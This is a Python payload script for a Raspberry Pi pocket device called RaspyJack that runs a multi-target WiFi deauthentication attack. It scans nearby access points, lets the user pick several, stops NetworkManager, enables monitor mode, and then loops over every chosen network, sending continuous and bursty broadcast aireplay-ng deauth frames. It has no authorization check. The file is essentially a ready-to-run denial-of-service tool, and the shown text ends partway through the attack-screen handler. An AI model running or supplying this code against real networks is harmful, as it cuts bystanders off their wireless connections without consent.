#!/usr/bin/env python3
"""
RaspyJack WiFi Deauth - Multi-Target Version
=================================================
Clear button layout for multi-target attacks:

MAIN MENU:
- KEY1: Scan networks
- LEFT: Adjust scan timeout  
- RIGHT: Change attack mode
- KEY3: Exit

NETWORK SELECTION (after scan):
- UP/DOWN: Navigate networks
- OK: Toggle network selection (add/remove from targets)
- RIGHT: Start attack (single or multi-target)
- KEY1: Rescan
- KEY2: Clear all selections
- KEY3: Back to main menu

DURING ATTACK:
- KEY2: Stop all attacks
- KEY3: Exit
"""

import os, sys, time, signal, subprocess, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# WiFi Integration - Import dynamic interface support
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import (
        get_best_interface,
        get_available_interfaces,
        get_interface_status,
        set_raspyjack_interface
    )
    WIFI_INTEGRATION = True
    print("✅ WiFi integration loaded - dynamic interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    WIFI_INTEGRATION = False

# Configuration
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
SCAN_TIMEOUT = 15
LOG_FILE = os.path.join(os.path.dirname(__file__), "deauth_debug.log")

def log(message):
    """Write message to log file."""
    timestamp = time.strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
            f.flush()
    except:
        pass

# Dynamic WiFi interface selection
def get_wifi_interface():
    """Get the best WiFi interface for deauth attacks."""
    if WIFI_INTEGRATION:
        # Use WiFi integration to get best interface, preferring WiFi dongles
        interfaces = get_available_interfaces()
        wifi_interfaces = [iface for iface in interfaces if iface.startswith('wlan')]
        
        if wifi_interfaces:
            # Prefer external dongles (wlan1, wlan2) over built-in (wlan0)
            wifi_interfaces.sort(key=lambda x: (x != 'wlan1', x != 'wlan2', x))
            selected_interface = wifi_interfaces[0]
            
            # Check interface status
            status = get_interface_status(selected_interface)
            if status["connected"]:
                try:
                    log(f"Using connected WiFi interface: {selected_interface}")
                except:
                    print(f"Using connected WiFi interface: {selected_interface}")
                return selected_interface
            else:
                try:
                    log(f"Selected interface {selected_interface} not connected, but proceeding anyway")
                except:
                    print(f"Selected interface {selected_interface} not connected, but proceeding anyway")
                return selected_interface
        else:
            try:
                log("No WiFi interfaces found via integration")
            except:
                print("No WiFi interfaces found via integration")
            return "wlan1"  # Fallback
    else:
        # Fallback to hardcoded interface
        try:
            log("Using fallback interface: wlan1")
        except:
            print("Using fallback interface: wlan1")
        return "wlan1"

# Initialize WiFi interface
WIFI_INTERFACE = get_wifi_interface()

# Interface validation patterns
INTERFACE_PATTERNS = ["wlan0", "wlan1", "wlan2", "wlan0mon", "wlan1mon", "wlan2mon"]

# Global state
running = True
current_attack_process = None
networks = []
selected_index = 0
selected_targets = []
attack_processes = []
current_screen = "main"  # main, networks, attacking

# Thread control
attack_stop_event = threading.Event()
attack_threads = []

# GPIO and LCD setup
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
canvas = Image.new("RGB", (WIDTH, HEIGHT), "black")
draw = ImageDraw.Draw(canvas)

def show(lines):
    """Display text on LCD with word wrapping."""
    if isinstance(lines, str):
        lines = [lines]
    
    # Simple word wrapping
    wrapped_lines = []
    for line in lines:
        if len(line) <= 20:
            wrapped_lines.append(line)
        else:
            words = line.split()
            current = ""
            for word in words:
                if len(current + word) <= 20:
                    current += word + " "
                else:
                    if current:
                        wrapped_lines.append(current.strip())
                    current = word + " "
            if current:
                wrapped_lines.append(current.strip())
    
    # Limit lines and display
    if len(wrapped_lines) > 8:
        wrapped_lines = wrapped_lines[:7] + ["..."]
    
    draw.rectangle((0, 0, WIDTH, HEIGHT), fill="black")
    y = 5
    for line in wrapped_lines:
        w = draw.textbbox((0, 0), line, font=font_large)[2]
        x = (WIDTH - w) // 2
        draw.text((x, y), line, font=font_large, fill="#00FF00")
        y += 12
    
    LCD.LCD_ShowImage(canvas, 0, 0)

def show_status(message):
    """Show short status message for LCD (15 chars max)."""
    # During attacks, only log status messages to avoid overwriting attack menu
    if current_screen == "attacking":
        log(f"STATUS: {message}")
    else:
        show([message[:15]])
        time.sleep(0.8)  # Brief display time

def pressed_button():
    """Return pressed button name."""
    for name, pin in PINS.items():
        if GPIO.input(pin) == 0:
            return name
    return None

def run_command(cmd, timeout=None):
    """Execute shell command."""
    try:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        stdout, stderr = process.communicate(timeout=timeout)
        result = stdout.decode("utf-8") + stderr.decode("utf-8")
        return result
    except:
        return "Error"

def check_interface_exists():
    """Check if the WiFi interface exists and is available."""
    global WIFI_INTERFACE
    
    log(f"Checking if interface {WIFI_INTERFACE} exists")
    show_status("Checking iface...")
    
    result = run_command(f"iwconfig {WIFI_INTERFACE}")
    
    if "No such device" in result:
        log(f"Interface {WIFI_INTERFACE} not found, trying alternatives")
        show_status("Finding iface...")
        
        # Try alternative interfaces
        for iface in INTERFACE_PATTERNS:
            result = run_command(f"iwconfig {iface}")
            if "No such device" not in result and "IEEE 802.11" in result:
                log(f"Found working interface: {iface}")
                WIFI_INTERFACE = iface
                show_status(f"Found {iface}")
                return True
        
        # Check for USB dongles specifically
        show_status("Check USB dongles...")
        usb_check = run_command("lsusb | grep -i 'realtek\|ralink\|atheros\|broadcom'")
        if usb_check:
            log(f"USB WiFi dongles detected: {usb_check}")
            show_status("USB dongles found!")
            time.sleep(1)
            show_status("Plug in USB dongle")
            time.sleep(2)
        else:
            show_status("No USB dongles!")
            time.sleep(1)
        
        show_status("No WiFi found!")
        return False
    
    show_status(f"Using {WIFI_INTERFACE}")
    return True

def setup_monitor_mode():
    """Set up monitor mode on the WiFi interface."""
    global WIFI_INTERFACE
    
    log("Setting up monitor mode")
    show_status("Setup monitor...")
    
    # Check if this is the onboard Raspberry Pi WiFi
    driver_check = run_command(f"ethtool -i {WIFI_INTERFACE} 2>/dev/null || echo 'unknown'")
    if "brcmfmac" in driver_check:
        log("DETECTED: Onboard Raspberry Pi WiFi (Broadcom 43430)")
        show_status("ONBOARD WIFI!")
        time.sleep(1)
        show_status("NO MONITOR MODE!")
        time.sleep(1)
        show_status("USE USB DONGLE!")
        time.sleep(2)
        
        show([
            "ONBOARD WIFI LIMITATION",
            "Broadcom 43430 chip",
            "NO monitor mode support",
            "Use USB WiFi dongle"
        ])
        time.sleep(3)
        
        show([
            "RECOMMENDED DONGLES:",
            "Alfa AWUS036ACH",
            "TP-Link TL-WN722N v1", 
            "Panda PAU09"
        ])
        time.sleep(3)
        
        show_status("Switch to USB dongle")
        return False
    
    # Kill interfering processes
    show_status("Stopping NM...")
    run_command("pkill -f NetworkManager")
    run_command("pkill -f wpa_supplicant")
    time.sleep(1)
    
    # Check current mode
    iwconfig_result = run_command(f"iwconfig {WIFI_INTERFACE}")
    log(f"Current interface status: {iwconfig_result[:200]}")
    
    if "Mode:Monitor" in iwconfig_result:
        log("Interface already in monitor mode")
        show_status("Monitor ready!")
        time.sleep(1)
        return True
    
    # Try to enable monitor mode
    show_status("Enable monitor...")
    
    # Method 1: Use airmon-ng
    log("Trying airmon-ng method")
    show_status("Try airmon-ng...")
    result = run_command(f"airmon-ng start {WIFI_INTERFACE}")
    log(f"airmon-ng result: {result}")
    
    # Check if a monitor interface was created
    for iface in [f"{WIFI_INTERFACE}mon", WIFI_INTERFACE]:
        check_result = run_command(f"iwconfig {iface}")
        if "Mode:Monitor" in check_result:
            log(f"Monitor mode enabled on {iface}")
            WIFI_INTERFACE = iface
            show_status("Monitor OK!")
            time.sleep(1)
            return True
    
    # Method 2: Manual iwconfig method
    log("Trying manual iwconfig method")
    show_status("Manual setup...")
    run_command(f"ifconfig {WIFI_INTERFACE} down")
    time.sleep(0.5)
    run_command(f"iwconfig {WIFI_INTERFACE} mode monitor")
    time.sleep(0.5)
    run_command(f"ifconfig {WIFI_INTERFACE} up")
    time.sleep(1)
    
    # Verify monitor mode
    check_result = run_command(f"iwconfig {WIFI_INTERFACE}")
    if "Mode:Monitor" in check_result:
        log("Monitor mode enabled via iwconfig")
        show_status("Monitor OK!")
        time.sleep(1)
        return True
    
    log("Failed to enable monitor mode")
    show_status("Monitor FAILED!")
    time.sleep(2)
    return False

def validate_setup():
    """Validate that everything is set up correctly for deauth attacks."""
    log("Validating setup for deauth attacks")
    show_status("Validating...")
    
    # Check if interface exists
    if not check_interface_exists():
        show_status("No WiFi iface!")
        time.sleep(2)
        return False
    
    # Check if aircrack-ng tools are available
    show_status("Check tools...")
    aireplay_check = run_command("which aireplay-ng")
    if "aireplay-ng" not in aireplay_check:
        show_status("No aireplay!")
        time.sleep(3)
        return False
    
    airodump_check = run_command("which airodump-ng")
    if "airodump-ng" not in airodump_check:
        show_status("No airodump!")
        time.sleep(3)
        return False
    
    # Set up monitor mode
    if not setup_monitor_mode():
        return False
    
    log("Setup validation completed successfully")
    show_status("Setup OK!")
    time.sleep(1)
    return True

def scan_networks():
    """Scan for networks and return list."""
    log(f"Starting network scan, timeout: {SCAN_TIMEOUT}s")
    show_status(f"Scanning {SCAN_TIMEOUT}s...")
    
    # Clean up and scan
    subprocess.run("rm -f /tmp/deauth_scan*", shell=True)
    cmd = f"timeout {SCAN_TIMEOUT} airodump-ng --band abg --output-format csv -w /tmp/deauth_scan {WIFI_INTERFACE}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    log(f"Scan command completed with return code: {result.returncode}")
    
    show_status("Parsing scan...")
    
    # Parse results
    networks = []
    try:
        with open('/tmp/deauth_scan-01.csv', 'r') as f:
            content = f.read()
        
        if 'Station MAC' in content:
            content = content.split('Station MAC')[0]
        
        lines = content.strip().split('\n')
        bssid_idx = essid_idx = channel_idx = -1
        
        for line in lines:
            if 'BSSID' in line and 'ESSID' in line:
                header_parts = line.split(',')
                for i, part in enumerate(header_parts):
                    if 'BSSID' in part:
                        bssid_idx = i
                    elif 'ESSID' in part:
                        essid_idx = i
                    elif 'channel' in part.lower():
                        channel_idx = i
                continue
            
            if bssid_idx >= 0 and essid_idx >= 0:
                parts = line.split(',')
                if len(parts) > max(bssid_idx, essid_idx):
                    bssid = parts[bssid_idx].strip()
                    essid = parts[essid_idx].strip().strip('"')
                    channel = parts[channel_idx].strip() if channel_idx >= 0 and channel_idx < len(parts) else "?"
                    
                    if essid and bssid and ':' in bssid:
                        # Add band indicator
                        band = ""
                        if channel.isdigit():
                            ch = int(channel)
                            if ch <= 14:
                                band = " (2.4G)"
                            elif ch >= 36:
                                band = " (5G)"
                        
                        networks.append({
                            "essid": essid[:16] + band,
                            "bssid": bssid,
                            "channel": channel
                        })
    except Exception as e:
        log(f"Error parsing scan results: {str(e)}")
    
    log(f"Found {len(networks)} networks")
    show_status(f"Found {len(networks)} nets")
    time.sleep(1)
    
    for i, net in enumerate(networks):
        log(f"Network {i+1}: {net['essid']} - {net['bssid']} - Ch{net['channel']}")
    
    return networks

def start_attacks():
    """Start attacks on selected targets using direct Python attack."""
    global attack_processes, current_attack_process, attack_stop_event
    
    if not selected_targets:
        show_status("No targets!")
        time.sleep(2)
        return False
    
    log(f"Starting attacks on {len(selected_targets)} targets")
    show_status("Start attacks...")
    
    # Reset stop event
    attack_stop_event.clear()
    
    # Kill any interfering processes first
    show_status("Kill old procs...")
    run_command("pkill -f aireplay-ng")
    run_command("pkill -f airodump-ng")
    time.sleep(1)
    
    # Use direct Python attack (proven working)
    return start_direct_python_attack()

def start_direct_python_attack():
    """Start a direct Python-controlled deauth attack with aggressive triple attacks."""
    global attack_processes, attack_threads
    
    log("Starting direct Python deauth attack")
    show_status("Start Python...")
    
    def aggressive_attack_worker():
        """Worker thread that performs aggressive triple deauth attacks on all targets."""
        attack_log = LOG_FILE.replace('.log', '_attack.log')
        attack_count = 0
        
        def log_attack(message):
            timestamp = time.strftime("%H:%M:%S")
            try:
                with open(attack_log, 'a') as f:
                    f.write(f"[{timestamp}] {message}\n")
                    f.flush()
                log(message)  # Also log to main log
            except:
                pass
        
        log_attack("=== Starting Aggressive Triple Deauth Attack ===")
        log_attack(f"Interface: {WIFI_INTERFACE}")
        log_attack(f"Targets: {len(selected_targets)}")
        
        # Initialize attack log
        try:
            with open(attack_log, 'w') as f:
                f.write(f"=== Aggressive Deauth Attack Log Started {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        except:
            pass
        
        while not attack_stop_event.is_set():
            for target in selected_targets:
                if attack_stop_event.is_set():
                    break
                    
                if target['channel'] == '?' or not target['channel'].isdigit():
                    log_attack(f"Skipping {target['essid']} - invalid channel")
                    continue
                
                attack_count += 1
                log_attack(f"=== Attack #{attack_count} on {target['essid']} (Ch{target['channel']}) ===")
                
                # Update LCD with current target
                show_status(f"Attack {target['essid'][:8]}")
                
                try:
                    # Set channel
                    log_attack(f"Setting channel {target['channel']}...")
                    channel_result = run_command(f"iwconfig {WIFI_INTERFACE} channel {target['channel']}")
                    time.sleep(0.5)
                    
                    if attack_stop_event.is_set():
                        break
                    
                    # Verify channel (simplified check)
                    verify_result = run_command(f"iwconfig {WIFI_INTERFACE}")
                    if f"Channel:{target['channel']}" in verify_result or f"Frequency:" in verify_result:
                        log_attack(f"Channel {target['channel']} set successfully")
                    else:
                        log_attack(f"WARNING: Channel {target['channel']} may not be set correctly")
                        log_attack(f"iwconfig output: {verify_result[:100]}")
                    
                    # Check interface mode
                    if "Mode:Monitor" in verify_result:
                        log_attack("Interface in Monitor mode - GOOD")
                    else:
                        log_attack("WARNING: Interface not in Monitor mode!")
                        log_attack(f"Current mode: {verify_result}")
                    
                    # RESEARCH-BASED MAXIMUM DEAUTH AGGRESSION
                    log_attack("Starting RESEARCH-BASED MAXIMUM DEAUTH AGGRESSION...")
                    
                    # Attack 1: CONTINUOUS Broadcast Deauth (PROVEN WORKING - 10 seconds unlimited)
                    if not attack_stop_event.is_set():
                        log_attack("Launching CONTINUOUS broadcast deauth (10 seconds unlimited)...")
                        show_status("CONTINUOUS 10s")
                        cmd1 = f"timeout 10 aireplay-ng -0 0 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
                        log_attack(f"Command: {cmd1}")
                        result1 = run_command(cmd1)
                        log_attack(f"CONTINUOUS result: {result1[:200]}")
                        if "Sending" in result1 and "DeAuth" in result1:
                            log_attack("CONTINUOUS deauth: SUCCESS - unlimited packets sent!")
                        else:
                            log_attack("CONTINUOUS deauth: May have worked (check for DeAuth messages)")
                        
                        time.sleep(0.3)
                    
                    # Attack 2: BURST 1 - 64 packet broadcast (PROVEN WORKING)
                    if not attack_stop_event.is_set():
                        log_attack("Launching BURST 1 broadcast deauth (64 packets)...")
                        show_status("BURST 1 - 64pkt")
                        cmd2 = f"aireplay-ng -0 64 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
                        log_attack(f"Command: {cmd2}")
                        result2 = run_command(cmd2)
                        log_attack(f"BURST 1 result: {result2[:200]}")
                        if "Sending" in result2 and "DeAuth" in result2:
                            log_attack("BURST 1 deauth: SUCCESS - packets sent!")
                        else:
                            log_attack("BURST 1 deauth: May have worked")
                        
                        time.sleep(0.3)
                    
                    # Attack 3: BURST 2 - 64 packet broadcast (PROVEN WORKING)
                    if not attack_stop_event.is_set():
                        log_attack("Launching BURST 2 broadcast deauth (64 packets)...")
                        show_status("BURST 2 - 64pkt")
                        cmd3 = f"aireplay-ng -0 64 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
                        log_attack(f"Command: {cmd3}")
                        result3 = run_command(cmd3)
                        log_attack(f"BURST 2 result: {result3[:200]}")
                        if "Sending" in result3 and "DeAuth" in result3:
                            log_attack("BURST 2 deauth: SUCCESS - packets sent!")
                        else:
                            log_attack("BURST 2 deauth: May have worked")
                        
                        time.sleep(0.3)
                    
                    # Attack 4: BURST 3 - 64 packet broadcast (PROVEN WORKING)
                    if not attack_stop_event.is_set():
                        log_attack("Launching BURST 3 broadcast deauth (64 packets)...")
                        show_status("BURST 3 - 64pkt")
                        cmd4 = f"aireplay-ng -0 64 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
                        log_attack(f"Command: {cmd4}")
                        result4 = run_command(cmd4)
                        log_attack(f"BURST 3 result: {result4[:200]}")
                        if "Sending" in result4 and "DeAuth" in result4:
                            log_attack("BURST 3 deauth: SUCCESS - packets sent!")
                        else:
                            log_attack("BURST 3 deauth: May have worked")
                    
                    log_attack(f"Completed RESEARCH-BASED MAXIMUM DEAUTH on {target['essid']}")
                    log_attack("TOTAL PROVEN DEAUTH: 10s continuous + 64+64+64 = ~300+ packets!")
                    log_attack("Using ONLY broadcast deauth (-c FF:FF:FF:FF:FF:FF) that WORKS!")
                    log_attack("---")
                    
                except Exception as e:
                    log_attack(f"Error attacking {target['essid']}: {str(e)}")
                    import traceback
                    log_attack(f"Full error: {traceback.format_exc()}")
                
                # Brief pause between targets (original timing)
                if not attack_stop_event.wait(1):  # Wait 1 second or until stop event
                    continue
                else:
                    break
            
            # Pause between attack cycles (original timing)
            show_status("Cycle pause...")
            if not attack_stop_event.wait(3):  # Wait 3 seconds or until stop event
                log_attack("Aggressive attack cycle completed, continuing...")
            else:
                break
        
        log_attack("Aggressive attack thread stopping...")
        show_status("Attack stopped")
    
    # Start the aggressive worker thread
    try:
        attack_thread = threading.Thread(target=aggressive_attack_worker, daemon=True)
        attack_thread.start()
        attack_threads.append(attack_thread)
        
        # Add to attack_processes for compatibility with UI
        attack_processes.append({
            'type': 'thread',
            'thread': attack_thread,
            'target': {'essid': f'Aggressive attack on {len(selected_targets)} targets'}, 
            'cmd': 'Aggressive triple deauth attack'
        })
        
        log(f"Started aggressive attack on {len(selected_targets)} targets")
        show_status("Aggressive ON!")
        time.sleep(1)
        return True
        
    except Exception as e:
        log(f"Failed to start aggressive attack: {str(e)}")
        import traceback
        log(f"Full error: {traceback.format_exc()}")
        show_status("Attack failed!")
        return False



def stop_all_attacks():
    """Stop all running attacks - both processes and threads."""
    global attack_processes, current_attack_process, attack_stop_event, attack_threads
    
    stopped_count = 0
    
    # Signal all threads to stop
    attack_stop_event.set()
    
    # Stop single attack
    if current_attack_process:
        try:
            os.killpg(os.getpgid(current_attack_process.pid), signal.SIGTERM)
            current_attack_process.wait()
            current_attack_process = None
            stopped_count += 1
        except:
            pass
    
    # Stop multi-target attacks
    for attack_info in attack_processes:
        try:
            if attack_info.get('type') == 'process':
                # Stop subprocess
                os.killpg(os.getpgid(attack_info['process'].pid), signal.SIGTERM)
                attack_info['process'].wait()
                stopped_count += 1
                log(f"Stopped process attack on {attack_info['target']['essid']}")
            elif attack_info.get('type') == 'thread':
                # Thread will stop due to attack_stop_event being set
                log(f"Signaled thread attack to stop")
                stopped_count += 1
        except Exception as e:
            log(f"Error stopping attack: {str(e)}")
    
    # Wait for threads to finish
    for thread in attack_threads:
        if thread.is_alive():
            thread.join(timeout=2)  # Wait up to 2 seconds for thread to stop
    
    attack_processes.clear()
    attack_threads.clear()
    log(f"Stopped {stopped_count} attacks")
    return stopped_count

def simple_cleanup():
    """Simple, reliable cleanup without complex interface detection."""
    try:
        log("Starting simple cleanup")
        show_status("Cleaning up...")
        
        # Stop all attacks
        stop_all_attacks()
        
        # Kill any remaining processes
        run_command("pkill -f aireplay-ng 2>/dev/null || true")
        run_command("pkill -f airodump-ng 2>/dev/null || true")
        
        # Try to restart network manager (ignore errors)
        run_command("systemctl start NetworkManager 2>/dev/null || true")
        
        log("Simple cleanup completed")
        
    except Exception as e:
        log(f"Error during cleanup: {str(e)}")
        # Continue anyway
        pass

def signal_handler(signum, frame):
    """Handle signals (like Ctrl+C) for clean exit."""
    global running
    log(f"Received signal {signum}, initiating clean shutdown")
    running = False
    simple_cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    sys.exit(0)

# Set up signal handlers for clean exit
signal.signal(signal.SIGINT, signal_handler)   # Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # Termination signal

# Initialize log
try:
    with open(LOG_FILE, 'w') as f:
        f.write(f"=== WiFi Deauth Log Started {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        f.write(f"Using interface: {WIFI_INTERFACE}\n")
        f.write(f"WiFi integration: {WIFI_INTEGRATION}\n")
except:
    pass

show(["WiFi Deauth Payload", "Multi-Target Version", f"Interface: {WIFI_INTERFACE}", "Initializing..."])
time.sleep(2)

# Validate setup before starting
if not validate_setup():
    show(["Setup failed!", "Check logs and", "fix issues", "Press KEY3 to exit"])
    while True:
        btn = pressed_button()
        if btn == "KEY3":
            break
        time.sleep(0.1)
    simple_cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    sys.exit(1)

def show_main_menu_page():
    """Show the current main menu page."""
    global main_menu_page
    
    if main_menu_page == 0:
        show([
            "MAIN MENU - PAGE 1",
            f"Interface: {WIFI_INTERFACE[:8]}",
            f"Timeout: {SCAN_TIMEOUT}s",
            "UP/DOWN: Change page"
        ])
    elif main_menu_page == 1:
        show([
            "MAIN MENU - PAGE 2", 
            "KEY1: Scan networks",
            "LEFT: Adjust timeout",
            "KEY2: Switch interface"
        ])
    elif main_menu_page == 2:
        show([
            "MAIN MENU - PAGE 3",
            "KEY3: Exit",
            "",
            ""
        ])

def switch_interface():
    """Switch WiFi interface using the proven fast_wifi_switcher approach."""
    global WIFI_INTERFACE
    
    if not WIFI_INTEGRATION:
        show_status("WiFi integ N/A!")
        time.sleep(2)
        return
    
    # Get current interface
    current = WIFI_INTERFACE
    
    # Determine target interface (toggle between wlan0 and wlan1)
    if current == 'wlan0':
        target_interface = 'wlan1'
    elif current == 'wlan1':
        target_interface = 'wlan0'
    else:
        # If current is not wlan0/wlan1, default to wlan1
        target_interface = 'wlan1'
    
    show_status(f"Switch to {target_interface}")
    
    def lcd_callback(msg):
        """Callback to show status on LCD."""
        show_status(msg[:15])
        time.sleep(0.5)
    
    try:
        log(f"🔄 Switching to {target_interface} using proven integration function")
        
        # Use the SAME proven approach as fast_wifi_switcher.py
        # This includes all the bug fixes and working code
        success = set_raspyjack_interface(target_interface, lcd_callback)
        
        if success:
            WIFI_INTERFACE = target_interface
            show_status("Switch OK!")
            log(f"✅ Successfully switched to {target_interface}")
            time.sleep(1)
        else:
            show_status("Switch failed!")
            log(f"❌ Failed to switch to {target_interface}")
            time.sleep(2)
            
    except Exception as e:
        show_status("Switch error!")
        log(f"❌ Switch error: {e}")
        time.sleep(2)

# Main event loop
current_screen = "main"
main_menu_page = 0  # Track which page of main menu we're on
show([
    "MAIN MENU - PAGE 1",
    f"Interface: {WIFI_INTERFACE[:8]}",
    f"Timeout: {SCAN_TIMEOUT}s",
    "UP/DOWN: Change page"
])

try:
    # Initialize periodic refresh for attacking screen
    last_attacking_refresh = 0
    ATTACKING_REFRESH_INTERVAL = 3  # Refresh attacking screen every 3 seconds
    
    while running:
        try:
            current_time = time.time()
            
            # Periodic refresh for attacking screen to keep menu visible
            if (current_screen == "attacking" and 
                current_time - last_attacking_refresh > ATTACKING_REFRESH_INTERVAL):
                
                show([f"ATTACKING {len(selected_targets)}", 
                      f"targets", 
                      "", 
                      "", 
                      "KEY2: Stop attacks", 
                      "KEY3: Exit"])
                last_attacking_refresh = current_time
            
            btn = pressed_button()
            
            if current_screen == "main":
                # MAIN MENU - Handle page navigation
                if btn == "UP":  # Previous page
                    while pressed_button() == "UP":
                        time.sleep(0.05)
                    main_menu_page = (main_menu_page - 1) % 3  # 3 pages total
                    show_main_menu_page()
                elif btn == "DOWN":  # Next page  
                    while pressed_button() == "DOWN":
                        time.sleep(0.05)
                    main_menu_page = (main_menu_page + 1) % 3  # 3 pages total
                    show_main_menu_page()
                elif btn == "KEY1":  # Scan networks
                    while pressed_button() == "KEY1":
                        time.sleep(0.05)
                    
                    networks = scan_networks()
                    if networks:
                        selected_index = 0
                        selected_targets = []
                        current_screen = "networks"
                        is_selected = networks[0]['bssid'] in [t['bssid'] for t in selected_targets]
                        marker = "[*]" if is_selected else "   "
                        show([f"NETWORKS ({len(networks)} found)", f"{marker} {networks[0]['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                    else:
                        show(["No networks found!", "Try longer timeout", "", "Press any key..."])
                        time.sleep(3)
                        show_main_menu_page()
                
                elif btn == "LEFT":  # Adjust timeout (RESTORED)
                    while pressed_button() == "LEFT":
                        time.sleep(0.05)
                    
                    while True:
                        show(["SCAN TIMEOUT", f"Current: {SCAN_TIMEOUT}s", "", "UP: +5s, DOWN: -5s", "OK: Confirm", "KEY3: Cancel"])
                        btn = pressed_button()
                        
                        if btn == "UP":
                            while pressed_button() == "UP":
                                time.sleep(0.05)
                            SCAN_TIMEOUT = min(60, SCAN_TIMEOUT + 5)
                        elif btn == "DOWN":
                            while pressed_button() == "DOWN":
                                time.sleep(0.05)
                            SCAN_TIMEOUT = max(5, SCAN_TIMEOUT - 5)
                        elif btn == "OK":
                            while pressed_button() == "OK":
                                time.sleep(0.05)
                            break
                        elif btn == "KEY3":
                            while pressed_button() == "KEY3":
                                time.sleep(0.05)
                            break
                        else:
                            time.sleep(0.05)
                    
                    show_main_menu_page()
                
                elif btn == "KEY2":  # Switch interface (MOVED HERE)
                    while pressed_button() == "KEY2":
                        time.sleep(0.05)
                    
                    switch_interface()
                    show_main_menu_page()
                
                elif btn == "KEY3":  # Exit
                    simple_cleanup()
                    running = False
                    break
            
            elif current_screen == "networks":
                # NETWORK SELECTION SCREEN
                if btn == "UP":  # Navigate up
                    while pressed_button() == "UP":
                        time.sleep(0.05)
                    selected_index = (selected_index - 1) % len(networks)
                    is_selected = networks[selected_index]['bssid'] in [t['bssid'] for t in selected_targets]
                    marker = "[*]" if is_selected else "   "
                    show([f"NETWORKS ({len(networks)} found)", f"{marker} {networks[selected_index]['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                
                elif btn == "DOWN":  # Navigate down
                    while pressed_button() == "DOWN":
                        time.sleep(0.05)
                    selected_index = (selected_index + 1) % len(networks)
                    is_selected = networks[selected_index]['bssid'] in [t['bssid'] for t in selected_targets]
                    marker = "[*]" if is_selected else "   "
                    show([f"NETWORKS ({len(networks)} found)", f"{marker} {networks[selected_index]['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                
                elif btn == "OK":  # Toggle selection
                    while pressed_button() == "OK":
                        time.sleep(0.05)
                    
                    network = networks[selected_index]
                    if network['bssid'] in [t['bssid'] for t in selected_targets]:
                        # Remove from selection
                        selected_targets = [t for t in selected_targets if t['bssid'] != network['bssid']]
                        log(f"Removed target: {network['essid']}")
                    else:
                        # Add to selection
                        selected_targets.append(network)
                        log(f"Added target: {network['essid']}")
                    
                    is_selected = network['bssid'] in [t['bssid'] for t in selected_targets]
                    marker = "[*]" if is_selected else "   "
                    show([f"NETWORKS ({len(networks)} found)", f"{marker} {network['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                
                elif btn == "RIGHT":  # Start attack
                    while pressed_button() == "RIGHT":
                        time.sleep(0.05)
                    
                    if selected_targets:
                        if start_attacks():
                            current_screen = "attacking"
                            show([f"ATTACKING {len(selected_targets)}", f"targets", "", "", "KEY2: Stop attacks", "KEY3: Exit"])
                        else:
                            show(["Failed to start", "attacks!", "", "Press any key..."])
                            time.sleep(3)
                    else:
                        show(["No targets selected!", "Select targets first", "", "Press any key..."])
                        time.sleep(2)
                        is_selected = networks[selected_index]['bssid'] in [t['bssid'] for t in selected_targets]
                        marker = "[*]" if is_selected else "   "
                        show([f"NETWORKS ({len(networks)} found)", f"{marker} {networks[selected_index]['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                
                elif btn == "KEY1":  # Rescan
                    while pressed_button() == "KEY1":
                        time.sleep(0.05)
                    
                    networks = scan_networks()
                    if networks:
                        selected_index = 0
                        selected_targets = []
                        is_selected = networks[0]['bssid'] in [t['bssid'] for t in selected_targets]
                        marker = "[*]" if is_selected else "   "
                        show([f"NETWORKS ({len(networks)} found)", f"{marker} {networks[0]['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                    else:
                        show(["No networks found!", "Try longer timeout", "", "Press any key..."])
                        time.sleep(3)
                
                elif btn == "KEY2":  # Clear selections
                    while pressed_button() == "KEY2":
                        time.sleep(0.05)
                    selected_targets = []
                    log("Cleared all target selections")
                    is_selected = networks[selected_index]['bssid'] in [t['bssid'] for t in selected_targets]
                    marker = "[*]" if is_selected else "   "
                    show([f"NETWORKS ({len(networks)} found)", f"{marker} {networks[selected_index]['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                
                elif btn == "KEY3":  # Back to main menu
                    while pressed_button() == "KEY3":
                        time.sleep(0.05)
                    current_screen = "main"
                    show_main_menu_page()
            
            elif current_screen == "attacking":
                # ATTACKING SCREEN
